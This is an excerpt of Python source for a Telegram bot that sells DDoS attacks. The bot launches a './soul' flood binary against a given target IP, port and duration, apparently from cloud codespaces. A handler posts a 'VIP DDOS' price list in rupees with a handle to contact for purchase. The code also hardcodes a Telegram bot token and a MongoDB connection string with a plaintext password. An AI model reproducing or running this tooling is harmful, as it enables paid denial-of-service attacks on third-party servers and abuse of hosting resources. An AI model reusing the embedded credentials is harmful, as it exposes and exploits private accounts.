...
TOKEN = '7117513635:AAHe80vqsLBN1MdCBx3Sk9LTQX8mkPKN_ms'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -1002153965900
CHANNEL_ID = -1002153965900
error_channel_id = -1002153965900
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 30 557278908920"
    try:
...
def handle_message(message):
    ...
    if message.text == "MANISH":
        bot.reply_to(message, "*@Legalbgmi*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "* 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 150 INR\n> WEEK - 700 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 1600 INR\n\nDM TO BUY @Legalbgmi*", parse_mode='Markdown')
